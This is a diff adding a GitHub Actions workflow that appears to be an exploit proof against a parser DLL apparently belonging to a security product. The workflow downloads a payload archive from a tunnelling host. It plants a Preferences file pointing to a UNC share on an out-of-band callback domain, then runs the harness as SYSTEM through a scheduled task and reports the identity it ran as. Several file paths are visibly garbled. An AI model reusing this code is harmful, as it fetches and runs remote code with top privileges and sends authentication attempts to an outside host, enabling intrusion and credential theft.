@@ -1,0 +1,41 @@
+name: beparser-native-unc-proof
+on:
+  workflow_dispatch:
+jobs:
+  proof:
+    runs-on: windows-2022
+    timeout-minutes: 10
+    steps:
+      - name: Exact DLL native SYSTEM UNC resolution proof
+        shell: powershell
+        run: |
+          $ErrorActionPreference = "Stop"
+          New-Item -ItemType Directory -Force C:eparser\profile | Out-Null
+          Invoke-WebRequest -Uri "https://gmdxb-2600-1f18-68f7-2200-aca3-a18d-1711-1005.run.pinggy-free.link/payload.zip" -OutFile C:eparser\payload.zip
+          Expand-Archive -Path C:eparser\payload.zip -DestinationPath C:eparser -Force
+          $unc = "\\j9adzdnyijwvlprf--benative1787400640.oob.blackmail.zip\owned"
+          $obj = @{extensions=@{settings=@{bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb=@{path=$unc;state=1}}}}
+          $obj | ConvertTo-Json -Depth 8 -Compress | Set-Content -Encoding UTF8 C:eparser\profile\Preferences
+          @'
+          @echo off
+          whoami > C:eparser\identity.txt
+          "C:eparser\profile_harness_native.exe" "C:eparser\CsBEParser.dll" "C:eparser\profile" > C:eparser\system.out 2> C:eparser\system.err
+          echo %ERRORLEVEL% > C:eparser\system.code
+          '@ | Set-Content -Encoding ASCII C:eparserun.cmd
+          schtasks /Create /TN CrowdStrikeResearchBEParser /TR C:eparserun.cmd /SC ONCE /ST 23:59 /RU SYSTEM /RL HIGHEST /F
+          schtasks /Run /TN CrowdStrikeResearchBEParser
+          for ($i=0; $i -lt 60; $i++) {
+            if (Test-Path C:eparser\system.code) { break }
+            Start-Sleep -Seconds 2
+          }
+          Write-Output "MARKER=benative1787400640"
+          Write-Output "UNC=$unc"
+          Write-Output "--- identity ---"
+          if (Test-Path C:eparser\identity.txt) { Get-Content C:eparser\identity.txt }
+          Write-Output "--- stdout ---"
+          if (Test-Path C:eparser\system.out) { Get-Content C:eparser\system.out }
+          Write-Output "--- stderr ---"
+          if (Test-Path C:eparser\system.err) { Get-Content C:eparser\system.err }
+          Write-Output "--- exit ---"
+          if (Test-Path C:eparser\system.code) { Get-Content C:eparser\system.code }
+          schtasks /Delete /TN CrowdStrikeResearchBEParser /F
